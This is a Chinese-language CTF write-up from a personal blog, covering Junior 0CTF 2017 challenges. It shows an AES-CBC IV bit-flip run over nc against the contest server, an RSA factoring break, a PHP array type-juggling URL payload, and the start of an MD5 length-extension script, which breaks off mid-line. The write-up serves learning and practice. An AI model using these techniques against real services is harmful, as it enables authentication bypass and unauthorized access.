<!DOCTYPE html>
<html>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="“flag{php_is_best_language_:P}”  前言SJTU 0ops 举办的0CTF校内交流赛，12月9号到10号。部分题目索引如下（文中涉及的文件下载[链接] QQ Group |Mystery Numbers |Easy Traffic Analyze |AES-serverbabyrsa |Shatter Sha512!|Penetrate In |Evababyre|">
<meta name="keywords" content="CTF">
<meta property="og:type" content="article">
<meta property="og:title" content="Junior 0CTF 2017 WriteUp (部分)">
<meta property="og:url" content="http://miyunluo.com/2017/12/10/jun0ctf/index.html">
<meta property="og:site_name" content="miyunLuo">
<meta property="og:description" content="“flag{php_is_best_language_:P}”  前言SJTU 0ops 举办的0CTF校内交流赛，12月9号到10号。部分题目索引如下（文中涉及的文件下载[链接] QQ Group |Mystery Numbers |Easy Traffic Analyze |AES-serverbabyrsa |Shatter Sha512!|Penetrate In |Evababyre|">
<meta property="og:locale" content="default">
<meta property="og:image" content="http://miyunluo.com/images/in-post/post-blog-jserv8.png">
<meta property="og:image" content="http://miyunluo.com/images/in-post/post-blog-jserv0.png">
<meta property="og:image" content="http://miyunluo.com/images/in-post/post-blog-j0serv1.png">
<meta property="og:image" content="http://miyunluo.com/images/in-post/post-blog-jserv2.png">
<meta property="og:image" content="http://miyunluo.com/images/in-post/post-blog-jserv3.png">
<meta property="og:image" content="http://miyunluo.com/images/in-post/post-blog-jserv9.png">
<meta property="og:image" content="http://miyunluo.com/images/in-post/post-blog-jserv4.png">
<meta property="og:image" content="http://miyunluo.com/images/in-post/post-blog-j0serv7.png">
<meta property="og:image" content="http://miyunluo.com/images/in-post/post-blog-jserv5.png">
<meta property="og:image" content="http://miyunluo.com/images/in-post/post-blog-jserv6.png">
<meta property="og:image" content="http://miyunluo.com/images/in-post/post-blog-jserv10.png">
<meta property="og:image" content="http://miyunluo.com/images/in-post/post-blog-jserv11.png">
<meta property="og:image" content="http://miyunluo.com/images/in-post/post-blog-jserv12.png">
<meta property="og:image" content="http://miyunluo.com/images/in-post/post-blog-jserv13.png">
<meta property="og:image" content="http://miyunluo.com/images/in-post/post-blog-jserv14.png">
<meta property="og:image" content="http://miyunluo.com/images/in-post/post-blog-jserv15.png">
<meta property="og:image" content="http://miyunluo.com/images/in-post/post-blog-jserv16.png">
<meta property="og:image" content="http://miyunluo.com/images/in-post/post-blog-jserv17.png">
<meta property="og:image" content="http://miyunluo.com/images/in-post/post-blog-jserv18.png">
<meta property="og:image" content="http://miyunluo.com/images/in-post/post-blog-jserv19.png">
<meta property="og:image" content="http://miyunluo.com/images/in-post/post-blog-jserv20.png">
<meta property="og:image" content="http://miyunluo.com/images/in-post/post-blog-jserv21.png">
<meta property="og:image" content="http://miyunluo.com/images/in-post/post-blog-jserv22.png">
<meta property="og:image" content="http://miyunluo.com/images/in-post/post-blog-j0serv8.gif">
<meta property="og:updated_time" content="2018-05-06T10:41:28.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Junior 0CTF 2017 WriteUp (部分)">
<meta name="twitter:description" content="“flag{php_is_best_language_:P}”  前言SJTU 0ops 举办的0CTF校内交流赛，12月9号到10号。部分题目索引如下（文中涉及的文件下载[链接] QQ Group |Mystery Numbers |Easy Traffic Analyze |AES-serverbabyrsa |Shatter Sha512!|Penetrate In |Evababyre|">
<meta name="twitter:image" content="http://miyunluo.com/images/in-post/post-blog-jserv8.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-200x200.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>Junior 0CTF 2017 WriteUp (部分)</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/research/">Research</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2018/03/25/realrbl/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2017/08/29/pyworoot/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://miyunluo.com/2017/12/10/jun0ctf/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://miyunluo.com/2017/12/10/jun0ctf/&text=Junior 0CTF 2017 WriteUp (部分)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://miyunluo.com/2017/12/10/jun0ctf/&title=Junior 0CTF 2017 WriteUp (部分)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://miyunluo.com/2017/12/10/jun0ctf/&is_video=false&description=Junior 0CTF 2017 WriteUp (部分)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Junior 0CTF 2017 WriteUp (部分)&body=Check out this article: http://miyunluo.com/2017/12/10/jun0ctf/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://miyunluo.com/2017/12/10/jun0ctf/&title=Junior 0CTF 2017 WriteUp (部分)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://miyunluo.com/2017/12/10/jun0ctf/&title=Junior 0CTF 2017 WriteUp (部分)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://miyunluo.com/2017/12/10/jun0ctf/&title=Junior 0CTF 2017 WriteUp (部分)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://miyunluo.com/2017/12/10/jun0ctf/&title=Junior 0CTF 2017 WriteUp (部分)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://miyunluo.com/2017/12/10/jun0ctf/&name=Junior 0CTF 2017 WriteUp (部分)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solved"><span class="toc-number">2.</span> <span class="toc-text">Solved</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0-QQ-Group-50"><span class="toc-number">2.1.</span> <span class="toc-text">0.QQ Group 50</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Mystery-Numbers-100"><span class="toc-number">2.2.</span> <span class="toc-text">1.Mystery Numbers 100</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Easy-Traffic-Analyze-200"><span class="toc-number">2.3.</span> <span class="toc-text">2.Easy Traffic Analyze 200</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-AES-server-100"><span class="toc-number">2.4.</span> <span class="toc-text">3.AES-server 100</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-babyrsa-100"><span class="toc-number">2.5.</span> <span class="toc-text">4.babyrsa 100</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Shatter-Sha512-150"><span class="toc-number">2.6.</span> <span class="toc-text">5.Shatter Sha512! 150</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-Penetrate-In-150"><span class="toc-number">2.7.</span> <span class="toc-text">6.Penetrate In 150</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#心路历程："><span class="toc-number">2.7.1.</span> <span class="toc-text">心路历程：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#解题思路："><span class="toc-number">2.7.2.</span> <span class="toc-text">解题思路：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-Eva-200"><span class="toc-number">2.8.</span> <span class="toc-text">7.Eva 200</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-babyre-100"><span class="toc-number">2.9.</span> <span class="toc-text">8.babyre 100</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-encoder-200"><span class="toc-number">2.10.</span> <span class="toc-text">9.encoder 200</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-seabreeze’s-stack-100"><span class="toc-number">2.11.</span> <span class="toc-text">10.seabreeze’s stack 100</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Have-Idea"><span class="toc-number">3.</span> <span class="toc-text">Have Idea</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#11-aes-duet"><span class="toc-number">3.1.</span> <span class="toc-text">11.aes-duet</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#感想"><span class="toc-number">4.</span> <span class="toc-text">感想</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Junior 0CTF 2017 WriteUp (部分)
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">miyunLuo</span>
      </span>
      
    <div class="postdate">
        <time datetime="2017-12-09T16:00:00.000Z" itemprop="datePublished">2017-12-10</time>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/CTF/">CTF</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <blockquote>
<p>“flag{php_is_best_language_:P}”</p>
</blockquote>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>SJTU 0ops 举办的0CTF校内交流赛，12月9号到10号。部分题目索引如下（文中涉及的文件下载[<a href="/docs/in-post/Junior0ctfQuestion.zip">链接</a>]</p>
<p><a href="#j0">QQ Group </a>|<a href="#j1">Mystery Numbers </a>|<a href="#j2">Easy Traffic Analyze </a>|<a href="#j3">AES-server</a><br><a href="#j4">babyrsa </a>|<a href="#j5">Shatter Sha512!</a>|<a href="#j6">Penetrate In </a>|<a href="#j7">Eva</a><br><a href="#j8">babyre</a>|<a href="#j9">encoder </a>|<a href="#j10">seabreeze’s stack </a>|<a href="#j11">aes-duet </a></p>
<h2 id="Solved"><a href="#Solved" class="headerlink" title="Solved"></a>Solved</h2><p></p><p id="j0"></p><p></p>
<h3 id="0-QQ-Group-50"><a href="#0-QQ-Group-50" class="headerlink" title="0.QQ Group 50"></a>0.QQ Group 50</h3><p>友情送分题，加入QQ交流群送一个flag。</p>
<p></p><p id="j1"></p><p></p>
<h3 id="1-Mystery-Numbers-100"><a href="#1-Mystery-Numbers-100" class="headerlink" title="1.Mystery Numbers 100"></a>1.Mystery Numbers 100</h3><p>题目描述没有什么实质性内容。给了一个link[<a href="https://ctf.0ops.sjtu.cn/attachment/download/signal.txt" target="_blank" rel="noopener">numbers_f300d7d6dce847a265407e072790370d</a>]，下载得到一个文本文件，内容如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5a6d78685a33746b4d4639354d48566661323477643139694e44557a4e6a52666144526f4e4638324e44593058336b3065545239</span><br></pre></td></tr></table></figure>
<p>因为看到全是字母与数字的排列，而且范围是0到f，应该是一串16进制的编码，以16进制解码到ascii，得到如下内容</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3tkMF95MHVfa24wd19iNDUzNjRfaDRoNF82NDY0X3k0eTR9</span><br></pre></td></tr></table></figure>
<p>应该还是一串被加密的字符，观察密文形式，很像base64，尝试用它来解码，得到flag。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s = <span class="string">'ZmxhZ3tkMF95MHVfa24wd19iNDUzNjRfaDRoNF82NDY0X3k0eTR9'</span></span><br><span class="line">a = base64.b64decode(s)</span><br><span class="line"></span><br><span class="line">&gt;&gt;flag&#123;d0_y0u_kn0w_b45364_h4h4_6464_y4y4&#125;</span><br></pre></td></tr></table></figure>
<p></p><p id="j2"></p><p></p>
<h3 id="2-Easy-Traffic-Analyze-200"><a href="#2-Easy-Traffic-Analyze-200" class="headerlink" title="2.Easy Traffic Analyze 200"></a>2.Easy Traffic Analyze 200</h3><p>题目给了一个link[<a href="https://ctf.0ops.sjtu.cn/upload/flag.pcap" target="_blank" rel="noopener">flag.pcap</a>]，是一个通信包文件，但是用wireshark打开提示格式不正确，应该是pcap文件受损。需要先修复pcap，可以使用[<a href="https://f00l.de/pcapfix/" target="_blank" rel="noopener">pcapfix</a>]软件来修复。</p>
<p>之后使用wireshark打开，通信包有很多，过滤一下http请求，发现只有3个</p>
<p><img src="/images/in-post/post-blog-jserv8.png" alt="img"></p>
<p>选择“文件” -&gt; “导出对象” -&gt; “HTTP”将其导出，得到三个文件。</p>
<p><img src="/images/in-post/post-blog-jserv0.png" alt="img"></p>
<p>其中upload.php很大，有1.9M，以二进制打开，发现文件里有flag1.png，同时有一个zip文件标志头信息504B 0304。</p>
<p><img src="/images/in-post/post-blog-j0serv1.png" alt="img"></p>
<p>将前面不重要的部分删去，得到的文件更改后缀名为zip解压，得到一张图（还挺好看的 (●ﾟωﾟ●)。</p>
<p><img src="/images/in-post/post-blog-jserv2.png" alt="img"></p>
<p>这里一般的套路是会在图片里隐写信息，将图片以二进制打开，因为文件比较大，在中间寻找flag较困难，考虑到简单的隐写一般在文件结尾处，直接去文件尾查询，得到了flag。</p>
<p><img src="/images/in-post/post-blog-jserv3.png" alt="img"></p>
<p></p><p id="j3"></p><p></p>
<h3 id="3-AES-server-100"><a href="#3-AES-server-100" class="headerlink" title="3.AES-server 100"></a>3.AES-server 100</h3><p>题目给出“nc 202.121.178.199 9999” 与一个文件[<a href="https://ctf.0ops.sjtu.cn/attachment/download/server.py" target="_blank" rel="noopener">server.py</a>]，其中nc是linux的netcat指令，具体介绍可以自己搜索，在此题中不是重点部分。server.py文件内容如下，也即是服务器上的代码。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>!/usr/bin/env python</span><br><span class="line"><span class="meta">#</span> coding=utf-8</span><br><span class="line"></span><br><span class="line">import SocketServer</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">with open('secretkey', 'rb') as f:</span><br><span class="line">    key = f.read()</span><br><span class="line">with open('flag.txt') as f:</span><br><span class="line">    flag = f.read()</span><br><span class="line"></span><br><span class="line">class handler(SocketServer.BaseRequestHandler):</span><br><span class="line"></span><br><span class="line">    def handle(self):</span><br><span class="line">        self.request.send("Welcome to the perfect aes-cbc cryptosystem!(decrypt-only)\n")</span><br><span class="line">        self.request.send("Please input your iv and encrypted message in hex:\n")</span><br><span class="line">        </span><br><span class="line">        data = self.request.recv(1024).rstrip()</span><br><span class="line">        try:</span><br><span class="line">            raw_data = data.decode('hex')</span><br><span class="line">        except Exception, e:</span><br><span class="line">            self.request.send("Error: &#123;&#125;\n".format(e.message))</span><br><span class="line">            self.request.close()</span><br><span class="line">            return</span><br><span class="line"></span><br><span class="line">        if len(raw_data) &lt; 32 or len(raw_data) &amp; 0xf:</span><br><span class="line">            self.request.send("Your input is not valid!\n")</span><br><span class="line">            self.request.close()</span><br><span class="line">            return</span><br><span class="line">        </span><br><span class="line">        iv = raw_data[:16]</span><br><span class="line">        enc = raw_data[16:]</span><br><span class="line">        cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">        plain = cipher.decrypt(enc)</span><br><span class="line">        self.request.send("Here is your plaintext: &#123;&#125;\n".format(repr(plain)))</span><br><span class="line"></span><br><span class="line">        if plain[:5] == 'admin':</span><br><span class="line">            self.request.send("hello, admin! Here is your flag: &#123;&#125;".format(flag))</span><br><span class="line">        self.request.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    HOST, PORT = "localhost", 9999</span><br><span class="line">    server = SocketServer.TCPServer((HOST, PORT), handler)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>
<p>代码里显示<strong>AES.MODE_CBC</strong>，说明采用的是CBC(密文分组链接)模式，且代码为CBC的解密过程，CBC decryption见下图</p>
<p><img src="/images/in-post/post-blog-jserv9.png" alt="img"></p>
<p>代码内容只涉及了一组CBC的解密。要求输入初始向量iv与加密字符c的拼接串，同时服务器会返回解密后的明文p。数据关系为 p = XOR( iv, fk(c) )，题目显示需要得到的p前5位为“admin”才会返回flag。</p>
<p>这里使用异或运算的trick来求解。先自己构造一对iv0，c0，服务器会返回一个p0，记目标初始向量（ “admin……….”）为iv1。p0 = XOR( iv0, fk(c0) )，XOR( iv1, p0 ) = a = XOR( iv1, XOR( iv0, fk(c0) ) ) ，于是得到了XOR( iv1, fk(c0) ) = XOR( a, iv1 ) = b。因为是自己构造的，a与b都是可计算的值。也就是只要再次发送报文，初始向量为iv1，密文还为c0即可。</p>
<p>这里构造iv0, c0为全0字节，admin后面也以0补齐，具体过程见下图。（由此可见异或运算的问题还是挺大的，但是异或在加密中广为应用。</p>
<p><img src="/images/in-post/post-blog-jserv4.png" alt="img"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span>&gt;nc 202.121.178.199 9999</span><br><span class="line"><span class="meta">&gt;</span>&gt;0000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line"><span class="meta">&gt;</span>&gt;python</span><br><span class="line"><span class="meta">&gt;</span>&gt;'_\xf7;&gt;\xca\xdeQ\x16\x96\xe4y\xa7\x92\xfc\x9b\xbd'.encode('hex')</span><br><span class="line"><span class="meta">&gt;</span>&gt;'admin\00\00\00\00\00\00\00\00\00\00\00'.encode('hex')</span><br><span class="line"><span class="meta">&gt;</span>&gt;hex(0x5ff73b3ecade511696e479a792fc9bbd^0x61646d696e0000000000000000000000)</span><br><span class="line"><span class="meta">&gt;</span>&gt;exit()</span><br><span class="line"><span class="meta">&gt;</span>&gt;nc 202.121.178.199 9999</span><br><span class="line"><span class="meta">&gt;</span>&gt;3e935657a4de511696e479a792fc9bbd00000000000000000000000000000000</span><br></pre></td></tr></table></figure>
<p></p><p id="j4"></p><p></p>
<h3 id="4-babyrsa-100"><a href="#4-babyrsa-100" class="headerlink" title="4.babyrsa 100"></a>4.babyrsa 100</h3><p>题目提供了一个压缩文件[<a href="https://ctf.0ops.sjtu.cn/attachment/download/babyrsa.zip" target="_blank" rel="noopener">babyrsa.zip</a>]，包含RAS加密的公钥，密文，现在需要求明文。</p>
<p>首先从publicKey.pem中提取n，e</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">pub = RSA.importKey(open(<span class="string">'./publicKey.pem'</span>).read())</span><br><span class="line">n = long(pub.n)</span><br><span class="line">e = long(pub.e)</span><br><span class="line"></span><br><span class="line">&gt;&gt;n = <span class="number">39845701744153150941069529194757526450699838667585381414738119544695931460213</span></span><br><span class="line">&gt;&gt;e = <span class="number">65537</span></span><br></pre></td></tr></table></figure>
<p>这个公钥的问题出在n选择太小，直接暴力破解质因数，这里可以去[<a href="http://www.factordb.com" target="_blank" rel="noopener">factordb</a>]网站查询，也可以用python的包进行破解。(最开始是用python暴力破的，后来发现可以查询到)</p>
<p><img src="/images/in-post/post-blog-j0serv7.png" alt="img"></p>
<p>在质因子p，q都得到的情况下，后面就是顺水推舟的求私钥d，解明文p了。</p>
<p></p><p id="j5"></p><p></p>
<h3 id="5-Shatter-Sha512-150"><a href="#5-Shatter-Sha512-150" class="headerlink" title="5.Shatter Sha512! 150"></a>5.Shatter Sha512! 150</h3><p>题目描述“Google Shatter Sha256, so cooooooooooool! Can you break the sha512 algorithm to prove that you are a great genius?” 下面是一个链接，点进去是一个页面，显示如下内容，需要找到两个不同的值x和y，使得hash值一样。</p>
<p><img src="/images/in-post/post-blog-jserv5.png" alt="img"></p>
<p>题目说要攻破SHA512，显然目前是不可能的，于是需要找php的漏洞，使得x与y不等但是hash值相等。由于参数传递为GET方法，可以在参数上做手脚，使用如下url</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">202.121.178.201：8083?x[]=1&amp;y[]=2</span><br></pre></td></tr></table></figure>
<p>不等条件显然成立，这里x与y都成为<strong>Array</strong>类型，hash值都为<strong>Null</strong>，于是echo $flag. </p>
<p><strong>flag{php_is_best_language_:P}</strong> 被这个漏洞震惊了，果然PHP是最好的语言。</p>
<p></p><p id="j6"></p><p></p>
<h3 id="6-Penetrate-In-150"><a href="#6-Penetrate-In-150" class="headerlink" title="6.Penetrate In 150"></a>6.Penetrate In 150</h3><p>（来自dusmart大大）此题感觉比较复杂，需要详细说明一下，但是很多人很早就做了出来，不知道用的什么方法。链接点进去是如下界面</p>
<p><img src="/images/in-post/post-blog-jserv6.png" alt="img"></p>
<p>第一次访问会设置一个名为“hmac”的cookie，之后要求以POST的方式提交username与password，其中username字段必须为“admin”，password字段不能为“admin”，但是要求hamc与md5(“ $secret|$username|$password”)相等。</p>
<h4 id="心路历程："><a href="#心路历程：" class="headerlink" title="心路历程："></a>心路历程：</h4><ol>
<li>第一次访问该网站时，被设置了一个hmac字段的cookie，该hmac表示的是<code>md5(&quot;$secret|admin|admin&quot;)</code>，实际内容为”be9fcfa876db5f4184e1635ce6561de7”。</li>
<li>第一想法当然是尝试破解\$secret变量，用C++测试了6位以内所有可打印ascii码的组合，并没有找到使得<code>md5(&quot;$secret|admin|admin&quot;)</code>等于给定值的组合。然后使用了常用密码组合表去重复同样的操作，未果。</li>
<li>然后将思路转移到php本身的缺陷上来，观察到第六行使用了 != 符号，因此在提交数据时，构造字段<code>payload = {&quot;username&quot;:&quot;admin&quot;,&quot;password[]&quot;:&quot;admin&quot;}</code>，发现虽然第六行的比较通过，但是在第七行时校验不通过，因为该字符串变成了$secret|admin|Array，因此放弃了寻找php本身的漏洞。</li>
<li>第三次尝试从md5本身去下手，因为cookie在本地，可以被我们自己修改，因此考虑能否在$secret无法获取的情况下计算出md5(“$secret|admin|xxxxxxx”)，其中xxxxxx为我们可控制的password字段，不能为admin)。</li>
</ol>
<h4 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h4><ol>
<li><p>首先观察md5的整体过程，上半部分指出首先要对消息做填充，填充至512bit的整数倍，该图的下半部分显示了md5的整体计算过程，被哈希的消息Y被分割为长度为512bit的分组(Y0,Y1,…,Yn-1)，计算过程为：</p>
<ol>
<li><p>$H0=Hmd5(IV, Y0)$</p>
</li>
<li><p>$Hi = Hmd5(Hi-1, Yi)$</p>
</li>
<li><p>最终有 $md5(Y) = Hn-1$</p>
<p><em>IV是初始向量，是固定值0x0123456789ABCDEFFEDCBA9876543210</em></p>
<p><em>Hmd5表示md5中的每个分组的哈希操作，其输入为初始向量和512bit的待哈希分组，输出为128bit</em></p>
</li>
</ol>
</li>
</ol>
<p><img src="/images/in-post/post-blog-jserv10.png" alt="md5"></p>
<ol start="2">
<li><p>然后了解消息填充的具体过程</p>
<p>在MD5算法中，首先需要对信息进行填充，使其位长对512求余的结果等于448，<strong>并且填充必须进行，即使其位长对512求余的结果等于448</strong>。因此，信息的位长（Bits Length）将被扩展至N*512+448，N为一个非负整数，N可以是零。然后在这个结果后面附加一个以64位二进制数字表示扩充前实际信息的长度（小端序）。</p>
<p><a href="https://baike.baidu.com/item/MD5/212708?fr=aladdin#3_2" target="_blank" rel="noopener">来自百度百科的例子</a></p>
</li>
<li><p>最后，我们分析题目条件，题目给出了<strong>src = md5(\$secret|admin|admin)</strong>，我们需要构造一个<strong>des = md5(\$secret|admin|xxxxxx)</strong>，其中$secret长度未知，xxxxxx不能为admin，长度随意。很容易想到如果我们的md5(\$secret|admin|xxxxxx)的生成过程和md5(\$secret|admin|admin)的生成过程前半部分相同，但是比其多出一个分组，那么des = Hmd5(src, xxxxxx的后一部分+此次的填充信息)。那么就要求xxxxxx = admin+src构造过程中的填充信息+448bit内的随意值，为了使得des计算方便，我们就令xxxxxx = admin + src构造过程中的填充信息，此时<strong>des = Hmd5(src, des构造过程中的填充信息)</strong>。</p>
</li>
<li><p>python代码实现</p>
<p>为了实现方便，假设src的构造过程只使用了一个分组，即\$secret长度小于43，那么des过程中的填充信息就固定为 <code>&#39;\x80&#39;+&#39;\x00&#39;*55 +&#39;\x00\x02&#39;+&#39;\x00&#39;*6</code> ，共512bit，64字节，其中’\x00\x02’表示源消息长度为512bit，而xxxxxx会根据$secret的长度变化而变化，设其长度为length，则src构造过程中的源消息长度为length+12字节，则<code>xxxxxx = &quot;admin&quot; + &quot;\x80&quot; + &quot;\x00&quot; * (length+12-1) + (length+12的8字节小端表示)</code></p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">bytearr = [&apos;\x00&apos;,&apos;\x08&apos;,&apos;\x10&apos;,&apos;\x18&apos;,&apos;\x20&apos;,&apos;\x28&apos;,&apos;\x30&apos;,&apos;\x38&apos;,&apos;\x40&apos;,&apos;\x48&apos;,&apos;\x50&apos;,&apos;\x58&apos;,&apos;\x60&apos;,&apos;\x68&apos;,&apos;\x70&apos;,&apos;\x78&apos;,&apos;\x80&apos;,&apos;\x88&apos;,&apos;\x90&apos;,&apos;\x98&apos;,&apos;\xa0&apos;,&apos;\xa8&apos;,&apos;\xb0&apos;,&apos;\xb8&apos;,&apos;\xc0&apos;,&apos;\xc8&apos;,&apos;\xd0&apos;,&apos;\xd8&apos;,&apos;\xe0&apos;,&apos;\xe8&apos;,&apos;\xf0&apos;,&apos;\xf8&apos;,]</span><br><span class="line">bitarr = 